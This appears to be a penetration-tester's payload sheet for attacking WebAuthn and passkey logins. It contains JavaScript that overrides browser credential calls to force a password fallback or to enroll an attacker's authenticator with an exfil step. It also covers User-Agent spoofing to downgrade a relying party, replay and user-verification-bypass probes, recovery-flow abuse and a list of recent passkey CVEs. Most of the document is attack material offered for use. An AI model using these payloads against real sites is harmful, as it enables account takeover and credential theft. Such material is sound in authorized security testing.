---
title: "Payloads: WebAuthn / Passkey Attacks"
type: payloads
tags: [payloads, authentication, webauthn, passkey, mfa]
sources: []
date_created: 2026-06-17
date_updated: 2026-11-11
---

# Payloads: WebAuthn / Passkey Attacks

Routed via the `hunt-auth` skill. See [[passkey-webauthn-attacks]].

## Force fallback by neutralising the ceremony (XSS / malicious extension on RP origin)
```javascript
navigator.credentials.get = () => Promise.reject(new DOMException('NotAllowedError'));
navigator.credentials.get = () => Promise.resolve(null);   // some flows then offer password
```

## Hijack registration to enroll an attacker authenticator
```javascript
const orig = navigator.credentials.create.bind(navigator.credentials);
navigator.credentials.create = async (opts) => { exfil(opts); return attackerCredential; };
```

## AitM downgrade (proxy rewrites UA so RP disables passkeys)
```
User-Agent: ...Safari/605   # spoof "unsupported" browser -> RP offers SMS/OTP/password -> capture
```

## Server-side logic probes
```
# broken user/session binding: replay another account's assertion against your session
# user-verification bypass: send authenticatorData with the UV flag cleared (0) where UV is required
# challenge reuse: resubmit a prior challenge (test single-use + expiry)
# missing origin/RP-ID check: present an assertion captured from a different origin
```

## Recovery-flow abuse
```
# trigger "lost device" -> complete via weaker channel (email link, KBA, SMS+SIM swap) -> enroll new passkey
```

## NEW 2025-2026

1. **CVE-2025-71400 - better-auth passkey <1.4.0**: IDOR in the passkey deletion
   endpoint; authenticated user deletes ARBITRARY passkeys by enumerated ID -
   victim loses their passkey and falls back to weaker recovery. Test every
   passkey CRUD endpoint for owner checks, not just creation.
   https://nvd.nist.gov/vuln/detail/CVE-2025-71400
2. **CVE-2026-111911 - phpMyFAQ <4.1.9**: WebAuthn passkey authentication bypass;
   CVE-2026-48087 - OpenReception passkey injection. Two 2026 instances of the
   same class: the ceremony passes but the credential binding does not.
3. **2025-26 bug classes to probe**: (a) credential-ID substitution at login (server
   accepts any credential for any user), (b) RP-ID/origin validation gaps (cross-
   origin registration), (c) registration CSRF - inject YOUR passkey into the
   victim's account via unbound add-credential flow, (d) dead options the client
   sends (userVerification ignored server-side).
4. **Recovery-path bypass**: a passkey-protected account whose recovery fallback
   (SMS/email) is weaker = downgrade to the weakest factor; test the reset flow
   after passkey enrollment.
